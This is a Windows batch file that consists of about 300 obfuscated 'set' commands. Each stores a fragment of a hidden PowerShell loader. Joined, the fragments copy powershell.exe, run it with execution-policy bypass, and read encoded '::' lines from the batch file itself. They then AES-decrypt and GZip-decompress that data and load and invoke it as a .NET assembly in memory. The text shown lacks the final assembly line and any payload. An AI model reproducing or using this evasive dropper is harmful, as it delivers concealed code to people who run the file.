@echo off
set "NHSpKcffXh=y "
set "jwjigOTIQj=nd"
set "gnBSCAINxv=py"
set "GnSyOasiCI= /"
set "tKxOTOxUiH=co"
set "fEQPXJstuu= C"
set "TXxStdtSie=he"
set "NbbChPyDwF=we"
set "OQSsUmPkEJ=.e"
set "veAOeBfiAX=ow"
set "LNSyZyseXb=st"
set "DFisrFwIIv=:\"
set "lwAZXWzdsu=ws"
set "egWXmqhHct=\W"
set "ZrpHhyhSnP=rS"
set "dwaELjqhrS=em"
set "PoHtAGqQsv=do"
set "xWHNuKtxQx=\v"
set "nuYAqZhDCa=1."
set "VHRkLHQmTb=in"
set "DSSbCiFACP=Wi"
set "wQEEwPpbEP=xe"
set "NMTYSZgaDH=we"
set "eRREkgwZmD=Sy"
set "TcznnSUixm=ll"
set "cewbfEnVDX=32"
set "teATHkuXRh=ll"
set "iNTyZgkKwf=he"
set "eZfcRnLOmO=s\"
set "FOgqlVQvZX=0\"
set "ekbfslgfep=po"
set "cRvQBIPqBz=rs"
set "bJeXWumlpy=Po"
set "QfgiCECSrw=cd"
set "pCQbKMFJpX= %~dp0"
set "jWuTVVgIXF=-joi"
set "HdJQoZnuYT=-Obj"
set "xfkYdXjMhM== $S"
set "EtdmzFtxks=$aMb"
set "UbjbZxrCKp=3HWs"
set "OYvjjTnJgz=::De"
set "OIkTEOSzQD=)($u"
set "SXEccyZByR=Bj);"
set "NMPLJiViiP=ress"
set "NhkFKUZnDw=am;$"
set "fxWGuyswjh=esaB"
set "uKiwDfohHA= = N"
set "dvtljZBxpu=ispo"
set "iJZWBYJqdt=q.En"
set "VMQOdojPhu=1] -"
set "lCOfKyntcE=oArr"
set "CljnujNsxE=Gzzu"
set "BBRLxjTvod=v = "
set "yNyZVZlKKU=+hAO"
set "oDcGAbwEQa=pose"
set "GvDsxiDAYb=nage"
set "QXWxXuxiFF=ddin"
set "vzLJgyYdIV= New"
set "LPTmXrNRrM=y]::"
set "acyDYopUsL=);$p"
set "dJXDOEWKHq=.Mod"
set "eBNnQTWTcL=tem."
set "dUWnfrGHfV=Bj ="
set "abXNxWOGiq=bjec"
set "XypXuzshBL=ose("
set "XVCqgAnsEq=.Cry"
set "GMMKhdhVAz=ZjWi"
set "MjBXdreXhl=ck($"
set "ChWLAzrFVu=morF"
set "ytkdEwqKgT=ress"
set "LfudahluYz=ct S"
set "uXjDbpGjzf=Invo"
set "obUcenKwxP=]::("
set "GQqUamBKEC=ewLi"
set "gmAFfKFltI=Secu"
set "fUnRdeIJwN=sion"
set "fYaTTVfiJj=rity"
set "xoILkBcdRV=sGUc"
set "lpLyYRltGI=ew-O"
set "wBZVlbehYw=join"
set "iHDjuVbpKQ=Comp"
set "XtFUIBCBeu=OyzA"
set "rQNuAitvuJ=]::C"
set "wswYzCNzXv=ert]"
set "etnlmKflMY=rans"
set "avmfYMIfcP=bypa"
set "hVRjaRSmVA=gth)"
set "SUUluydwPH=stem"
set "TkvRgNpEDB=Hv);"
set "zvvVNpLmPX=.Cre"
set "CMxHSFvtQq=$ugo"
set "oKVsvgdBGF='dqR"
set "oRnjTmwaOQ=$SGz"
set "DquEBwJWzl=zu.I"
set "VfagchROAH=Bj.T"
set "eGNyFKDHtr=;$Sk"
set "UKfBRgknYm=ne);"
set "sgTXVjlaGM=Secu"
set "UTDTzEIMMA=.-16"
set "tqCwNOjBSt=n ''"
set "mwvqZMeOOo=tS46"
set "mZoQNTGYoU=File"
set "uuTGFeCPRC=pStr"
set "mPsBBFomOQ=ment"
set "vjwdZGOVtY=J = "
set "WvGzUEiwFk=raph"
set "IiFnIlEdnz=-4] "
set "GHIkuUkXHO=:: '"
set "EIWGxeLimK=m.IO"
set "oXfWizEMDA=embl"
set "BkrKVHlzZk=yste"
set "fRdmiPiiuh=Hv ="
set "IQhweOaPXv=fore"
set "MEqTSELgGd=ct S"
set "FZTqagxjwq=, (,"
set "blXykNZuxE=..-1"
set "JLXuAhIOoH=ress"
set "iceUTjqfee=nirt"
set "gnBAevjrCf=null"
set "HOsPgqkyAN= '')"
set "EdkYyZtGaH= '')"
set "pIJNbGZQXA=teq "
set "INtqbELkQg=gDR."
set "IsJLKaxUDS=em.C"
set "cMZXRetFaJ= = $"
set "vfQyBJUUSU=tryP"
set "riVCMMfnsI=('%*'"
set "SgYfdqblRI=IJ.D"
set "ZqynRpeJNI=Obje"
set "ddoXARSCaa=trea"
set "lSdQxvOoMv=oint"
set "IIiodxtkVK=1..-"
set "DcuyuDiwrU=tion"
set "JDiYRoPwET=.IO."
set "IRtZEGRqGi=eam("
set "kIZBsPHdTs=J) {"
set "xnGcTjsrht=pher"
set "MRfBTHIgUE=daeR"
set "LKvYiNzNmO=Fina"
set "SACdzDextD=New-"
set "zKiEhwKGCh=ddin"
set "KasFCRRPdH=vert"
set "pKTHCmeGAo=]::N"
set "bASRjUREeu='[-1"
set "XzIitcFLkU=New-"
set "uhPEZBsDlF=v4Ir"
set "WjhNybPVYR= [Sy"
set "sJyTbLhnwH=oryS"
set "PsxdUNNkud=ecry"
set "aZCBIGqhXW=$ugo"
set "VCOzRXcWmt=[Env"
set "ItVOIXImri=m(, "
set "lIEjomJHLc=tsWi"
set "OSgslJNDoz=).Sp"
set "FMRJGqIsoX=Comp"
set "LojLlJkSKj=16] "
set "etinhvlawy= [st"
set "TNvHXNzNHG=ing("
set "puGhBPjZmI=y.Cr"
set "ZOuHNheBWr=bstr"
set "BfhKmtiPqP=.Com"
set "mLMjVEtGtw=in $"
set "rzfgOUwTOn=pres"
set "wNKQOiZSdA=MFK."
set "bUkPqerCnV=goHv"
set "bixYuwleon=ay()"
set "qmUdggZLNp=::('"
set "xGXxnMrXXl=k; }"
set "fpGtAkBoHj=[]] "
set "eEImVEEsPw=($tZ"
set "JajngCUmBq=736u"
set "iNVHZSHMTn=$pUx"
set "BlrYyRGhlj=ZYYc"
set "GNcnlWjpKp=Gzzu"
set "YwSRjpUnzO=-1.."
set "JMrQgJQudM=:('g"
set "WqNbKbfyIP=Star"
set "QPJMnrQPuw=GEm."
set "KztDWOGjEO=$NmM"
set "XoVnWQJNgx=.Dis"
set "ZiPzhCTvQx=ose("
set "EoJolMHbLF== [S"
set "CEEdiFrEDc=Gzzu"
set "jTkSkfZttI=comp"
set "JnxoKaHHKv=brea"
set "tdWLumrXGJ=TllA"
set "wkaagfEltA=.Con"
set "jqxEiujaAW==');"
set "yUwAHLXRMO=iron"
set "kebDPkefdq=;$wg"
set "cRIoFQJUQl=gDR "
set "lRplkQpyDG=SGzz"
set "YxWEqhwIzG=ring"
set "wHoWgpScyn=wgte"
set "DukyUtTlPO=();$"
set "eViPpSuRlu=Disp"
set "lMyzAlfjHR=..-1"
set "GosiRaaUWV=6esa"
set "FkeHHRHzzV=ion."
set "CLyDjAKrHb=e = "
set "CJcSIcXhWI=d;$S"
set "HKhKkmTLYm=F'[-"
set "mDtsisUoBQ=saBm"
set "OmnCUgObNm=ptog"
set "DxKketAwzB=)($A"
set "SVROOOSFVi=[Sys"
set "JhdgaFNXDO=oin "
set "nBQOlLBBxo=ode]"
set "SFtefSItaG=PKCS"
set "vGTbAOceGl=rity"
set "hlRXAOtOvN=stem"
set "kcsbJIVKHn=('da"
set "iMienATwAO=y.Pa"
set "dhMVjdMRbA=pose"
set "PcoxDCiUOh=tZgD"
set "CRYickDhaZ=raph"
set "FJouqLbUSE=ptog"
set "MhhPBbiKAb=.Cop"
set "hkPsfAYOPE=vj0m"
set "rFjQJNKwbw=Disp"
set "XmBJSKbHlZ=FK, "
set "aLaqwZlgYg=em.I"
set "jVXWXXLnsm=7Yiv"
set "CSnwwgKBRc=.Cry"
set "rLmqDvszyL=);$S"
set "uzTtnEEexA=join"
set "AvQTVcKolO=ptor"
set "KTPduuqXEg=MbIJ"
set "rbCUHfgwbw=[Sys"
set "UezOvntwrM=  $A"
set "YGnVDEalsL=0O+g"
set "wvhNJWvMrd=flec"
set "MMsMLMjgHt='gni"
set "juEIpOssTQ=ke($"
set "wEByhRCoJD=rtS4"
set "emIleJrZwh=O.Me"
set "wFCiOJPDGK=BC;$"
set "aNusutkDnd=.Len"
set "ANFUYwvfiM=R.Su"
set "WFQXFtwUqK=-nop"
set "uDEUqzgNfJ= = $"
set "rYCAisDrhQ=le  "
set "cAfNMGWHNX= = ["
set "tqJdpRvnWc=$PLx"
set "kPTVyZfEQx=;$PL"
set "kjUeghdpaS=)))"
set "wdODjgXBcS=Gzzu"
set "GnzwaDBXcZ=pDZz"
set "qelgxgxkvm=v = "
set "YAKeXnhxGX=form"
set "YWxOnnOnyu=xLm "
set "bbbOcMopth=VFvu"
set "AeARMHCQNy=t Sy"
set "VMAmwgBlpA=yste"
set "IMYDihQdDP=V = "
set "KxpsdPCAJp=$ZjW"
set "kRFBWwKrqS='')("
set "rhmEMnYlJm=.Dis"
set "hNtJNXHFUP=Bmor"
set "QeMzXmdRnL=comm"
set "ICGbnPLkyE=goHv"
set "nzPiurGjzU=);$S"
set "qHYragPTLr=urit"
set "soHTXCGaiq=[Sys"
set "KJWrJYmqmx=th('"
set "oYrAZZdyRF=lBlo"
set "GhraTMdDnx=);$a"
set "kWbRdeAmGf=gnir"
set "WAzLpnRkZP=.Key"
set "kcxfYTLyee=tem."
set "LExNPVMwCv=and "
set "dYdAHzjJLQ=rofi"
set "NXouCXcqPm=ss -"
set "lXXjhSVZiq=();$"
set "CalvPHAtpt=ypto"
set "InTsOijqmD=);$S"
set "GqryivzxAo=ach "
set "AXFSfWxewC=7;$S"
set "kBumQILXJU=;$PL"
set "oUnScayRzj=m.IO"
set "dSsOZktgBw=aMbI"
set "eNAwgwZWZS=.Ass"
set "emfHAfIoBF=onve"
set "NQUmmWNEmY=-ep "
set "CzycIRCkLy=('%~f0'"
set "goqacfITzP='txe"
set "QvjfekXRRK=]::("
set "AXiqJXxtoe=('l0"
set "wgFHTohfYu=3); "
set "UDzcJYOJle=$pUx"
set "lGqrqZijbP=)) {"
set "uipMpsyKWO=m.Re"
set "ROcezIVUeO=Lm.T"
set "jHQvOuhdIZ=[-1."
set "DCASUSAkhQ=e]::"
set "WyMyOFXxpV=oL'["
set "pYLAWwpnHR=xLm."
set "UhRgizmAWu=grap"
set "mjacktXNEC===')"
set "EsZONXInNH='[-1"
set "VIMXnGAlCL=u.Pa"
set "REBesMfzcs=.Mem"
set "iEbUUoVSnP=tem."
set "BTRTeajTrV=[IO."
set "pnkPwXxITK=orF'"
set "WyYrppDnhP=Obje"
set "jhMnfSQUQL=ugoH"
set "LnApoBTJaL=Conv"
set "feUEyDjkvW=yste"
set "QMiMnZniMO=ect "
set "cZLhTJrTws=se()"
set "kPrUOZEbKU=mory"
set "AACYvMZyYL=;$Nm"
set "TlpeHKUfum=gMod"
set "LLwMqABBkJ=g = "
set "cvgWXTXMqo=$pUx"
set "gpWKnzEfFq=n ''"
set "WHyCqSiMNy=; };"
set "DzzAKzsTlC=();$"
set "RLjYqwwcst=UGTu"
set "efmuFMmkOC=Gzzu"
set "IQRrdiABFH= [Sy"
